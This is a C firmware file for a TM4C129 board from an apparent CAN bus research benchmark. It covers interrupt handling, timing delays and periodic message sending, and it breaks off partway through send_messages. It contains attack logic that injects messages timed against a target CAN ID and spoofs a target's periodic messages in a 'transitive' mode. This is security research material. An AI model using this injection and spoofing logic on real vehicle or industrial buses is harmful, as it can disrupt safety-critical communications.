Ipsitakoley/tm4c129-canbus/sae-benchmark/timers.c
// Author: Gedare Bloom

#include <stdint.h>
#include <stdbool.h>
#include "inc/hw_can.h"
#include "inc/hw_ints.h"
#include "inc/hw_memmap.h"
#include "inc/hw_types.h"
#include "driverlib/debug.h"
#include "driverlib/fpu.h"
#include "driverlib/can.h"
#include "driverlib/gpio.h"
#include "driverlib/interrupt.h"
#include "driverlib/pin_map.h"
#include "driverlib/rom.h"
#include "driverlib/rom_map.h"
#include "driverlib/sysctl.h"
#include "driverlib/timer.h"
#include "driverlib/uart.h"
#include "utils/uartstdio.h"

#include "saebench.h"
#include "experiment.h"


//----------------------------------------------------------------------------
// Modify anything below with care!
//----------------------------------------------------------------------------

// System clock rate in Hz, set in main() to 120 MHz
uint32_t g_ui32SysClock;
#define SYSCLK (120000000)
#define TICKS_PER_MS (SYSCLK/1000)
#define TICKS_PER_US (TICKS_PER_MS/1000)
#define TICKS_PER_BIT (SYSCLK/BITRATE)
#define INTERVAL (TICKS_PER_MS*5)   // 5 ms in 120 MHz ticks
#define LATENCY_8B_MAX (129*TICKS_PER_BIT) /* maximum message latency */

// counters
volatile uint32_t g_ui32RXMsgCount = 0;
volatile uint32_t g_ui32TXMsgCount = 0;

// flags used by interrupt handlers
volatile uint32_t g_ui32ErrFlag = 0;
volatile bool g_bRXFlag = 0;
volatile bool g_bTXFlag = 0;
volatile bool g_bTXFlag_5 = 0;
volatile bool g_bTXTarget_1 = 0;
volatile bool g_bTXTarget_2 = 0;
volatile bool g_bRESETFlag = 0;
volatile bool g_tick = false;
volatile bool g_tick_2 = false;

#define SYNC_MODE_INIT       (0)
#define SYNC_MODE_SYNCHED    (1)
#define SYNC_MODE_RESYNCH    (2)
#define SYNC_MODE_ADJUST     (3)
#define SYNC_MODE_RESET      (4)
volatile uint8_t g_sync = SYNC_MODE_INIT;

volatile bool g_reset = false;
volatile uint8_t g_msg_since_idle = 0;

// LED toggling states
volatile uint8_t g_pin0 = 0;
volatile uint8_t g_pin_2 = 0;

// keep track of interrupt event times
volatile uint32_t g_ui32LastCANIntTimer = 0;

// adds delay on reset
volatile uint32_t g_offset = 0;

// the (current) ID to attack
volatile uint32_t g_target_id = 0;
volatile uint32_t g_ui32TargetXmitTime = 0;
volatile uint8_t g_skip_attack = SKIP_ATTACK;

#define RXOBJECT_RESET      14
#define TXOBJECT_RESET      RXOBJECT_RESET
#define TXOBJECT_5          HIGHEST_TX_PRIORITY
#define TXOBJECT_Target_1   PRIORITY_Target_1
#define TXOBJECT_Target_2   PRIORITY_Target_2
#define TXOBJECT_RESERVED1  6
#define TXOBJECT_RESERVED2  7
#define TXOBJECT_10         9
#define TXOBJECT_100        11
#define TXOBJECT_RESERVED3  12
#define TXOBJECT_1000       13

#define RXOBJECT_RESERVED1  15
#define RXOBJECT            16


// The error routine that is called if the driver library encounters an error.
#ifdef DEBUG
void
__error__(char *pcFilename, uint32_t ui32Line)
{
}
#endif

void delay_us(uint32_t delay)
{
    uint32_t start = 0;
    uint32_t end = 1;
    // in case of an overflow.
    while (end >= start) { // loop in case of an overflow
        start = TimerValueGet(TIMER3_BASE, TIMER_A);
        end = start - delay*TICKS_PER_US; // timer3 is a free-running, countdown timer.
    }
    while (start > end) {
        start = TimerValueGet(TIMER3_BASE, TIMER_A);
    }
}

void delay_ms(uint32_t delay)
{
    delay_us(delay*1000);
}

void delay_ticks(uint32_t ticks)
{
    delay_us(ticks/TICKS_PER_US);
}

void CAN0IntHandler(void)
{
    uint32_t ui32Status;
    uint32_t timer_val;

    IntMasterDisable();

    g_ui32LastCANIntTimer = TimerValueGet(TIMER3_BASE, TIMER_A);

    ui32Status = CANIntStatus(CAN0_BASE, CAN_INT_STS_CAUSE);

    if(ui32Status == CAN_INT_INTID_STATUS) {

        ui32Status = CANStatusGet(CAN0_BASE, CAN_STS_CONTROL);

        // if using abort on txerror, check for the tx error condition on the target ID
        // if an error occurs, just cancel the transmission blindly.
        if (g_ui32ExpCtrl & DISABLE_RETRANS_TXERR) {
#if 0
            uint8_t lec = ui32Status & CAN_STATUS_LEC_MSK;
            if ( lec == CAN_STATUS_LEC_STUFF || lec == CAN_STATUS_LEC_BIT1 || lec == CAN_STATUS_LEC_BIT0 ) {
#endif
            if (ui32Status & CAN_STATUS_LEC_MSK) {
                if (g_target_id == TARGET_ID ) {
                    CANMessageClear(CAN0_BASE, TXOBJECT_Target_1);
                } else if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                    CANMessageClear(CAN0_BASE, TXOBJECT_Target_2);

                }
            }
        }


        // Errors are handled in CANErrorHandler().
        g_ui32ErrFlag |= ui32Status;
    } else {
        g_ui32ErrFlag = 0; // no errors

        if(ui32Status == RXOBJECT) {
            g_bRXFlag = true;
        }

#if defined(SEND_RESET)
        else if(ui32Status == TXOBJECT_RESET)
        {
            g_bRESETFlag = true;
        }
#endif

        else if(ui32Status == TXOBJECT_5) {
            g_bTXFlag_5 = true;

        }

        else if(ui32Status == TXOBJECT_Target_1) {
            g_bTXTarget_1 = true;
        }
        else if(ui32Status == TXOBJECT_Target_2) {
            g_bTXTarget_2 = true;
        }

        else {
            g_bTXFlag = true;
        }

        // This intends to count the number of messages since the last bus idle time.
        // TODO: It is a crude hack that may need tuning by changing the LATENCY definition.
        // A more clever solution would derive the expected timer value based on the length of
        // the received message, but we won't actually know that until (a) after that message is
        // received and (b) when the RX buffer is read in the main() busy-loop.
        if (g_ui32ExpCtrl & SYNC_0PHASE && g_sync == SYNC_MODE_RESET) {
            timer_val = TimerValueGet(TIMER2_BASE, TIMER_A);
            if (g_target_id == TARGET_ID) {
                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME);
            } else {
                TimerLoadSet(TIMER2_BASE, TIMER_A, TARGET_XMIT_TIME_2);
            }
            TimerEnable(TIMER2_BASE, TIMER_A);
            if (timer_val == 0) {
                g_msg_since_idle = 0;
            } else {
                g_msg_since_idle++;
            }
        }

        CANIntClear(CAN0_BASE, ui32Status);
    }
    IntMasterEnable();
}

void do_attack_injection(uint32_t count)
{
    static uint16_t skip_cnt = 0;
    if (g_ui32ExpCtrl & ATTACK_MASK) {
        if ( g_sync == SYNC_MODE_SYNCHED && g_reset == false ) {
            if ( skip_cnt % g_skip_attack == 0 ) {
                if ( g_target_id == TARGET_ID ) {
                    CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
                } else {
                    if (g_ui32ExpCtrl & ATTACK_TRANSITIVE) {
                        CANMessageSet(CAN0_BASE, TXOBJECT_Target_2, &g_sCAN0TxMessage_Target_2, MSG_OBJ_TYPE_TX);
                    }
                }
            }
            ++skip_cnt;
        } else {
            skip_cnt = 0;
        }
    }
}

void send_messages(uint32_t count)
{
    if (g_reset == false) {
        if (HIGH_PRIO_ID < g_target_id ) {
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
            do_attack_injection(count);
        } else {
            do_attack_injection(count);
            if (g_sCAN0TxMessage_5) {
                CANMessageSet(CAN0_BASE, TXOBJECT_5, g_sCAN0TxMessage_5, MSG_OBJ_TYPE_TX);
            }
        }

        // spoof the first target's messages after transition, assume it is always a 5 or 10 ms periodic message...
        if ((g_ui32ExpCtrl & ATTACK_TRANSITIVE) && g_target_id == TARGET_ID_2 ) {
            if (TARGET_ID < 0xAF || count % 2 == 0) {
                CANMessageSet(CAN0_BASE, TXOBJECT_Target_1, &g_sCAN0TxMessage_Target_1, MSG_OBJ_TYPE_TX);
            }
        }

        if ( count % 2 == 0 && g_sCAN0TxMessage_10) {
            CANMessageSet(CAN0_BASE, TXOBJECT_10, g_sCAN0TxMessage_10, MSG_OBJ_TYPE_TX);
        }

        if (count % 20 == 0 && g_sCAN0TxMessage_100) {
            CANMessageSet(CAN0_BASE, TXOBJECT_100, g_sCAN0TxMessage_100, MSG_OBJ_TYPE_TX);
        }

